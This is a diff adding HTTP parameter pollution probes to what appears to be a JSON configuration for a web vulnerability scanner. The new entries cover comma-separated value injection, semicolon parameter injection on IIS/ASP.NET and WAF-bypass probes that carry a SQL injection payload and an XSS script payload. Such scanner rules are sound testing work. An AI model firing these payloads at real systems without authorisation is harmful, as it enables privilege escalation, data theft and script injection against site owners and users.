@@ -49,6 +49,55 @@
           "confidence_boost": 35
         }
       ]
+    },
+    "comma_separated": {
+      "description": "Comma-separated value injection in a single parameter",
+      "tech_match": [],
+      "param_match": ["id", "user_id", "role", "permission", "scope"],
+      "probes": [
+        {
+          "payload": "{{baseline}},admin",
+          "description": "Append comma-separated value. Some backends split on comma and process each.",
+          "matchers": [{"type": "length_diff", "min_diff": 50}],
+          "severity": "medium",
+          "confidence_boost": 25
+        }
+      ]
+    },
+    "semicolon_separated": {
+      "description": "Semicolon-separated query parameter injection (IIS/ASP.NET treats ; as &)",
+      "tech_match": ["IIS", "ASP.NET"],
+      "param_match": ["id", "user_id", "page", "action"],
+      "probes": [
+        {
+          "payload": "{{baseline}};{{param}}=injected",
+          "description": "IIS/ASP.NET treats semicolons as parameter delimiters. The injected parameter may override or add to the request.",
+          "matchers": [{"type": "length_diff", "min_diff": 50}],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    },
+    "waf_bypass_via_hpp": {
+      "description": "Use HPP to bypass WAF inspection — WAF inspects first value, backend uses last",
+      "tech_match": [],
+      "param_match": ["id", "q", "search", "query", "name"],
+      "probes": [
+        {
+          "payload": "safe&{{param}}={{baseline}}' OR '1'='1",
+          "description": "First parameter is clean (passes WAF), second contains SQLi payload (processed by backend).",
+          "matchers": [{"type": "word", "value": ["error", "syntax", "SQL"]}],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "safe&{{param}}=<script>alert(1)</script>",
+          "description": "First parameter is clean, second contains XSS payload.",
+          "matchers": [{"type": "word", "value": ["<script>alert(1)</script>"]}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
     }
   }
 }
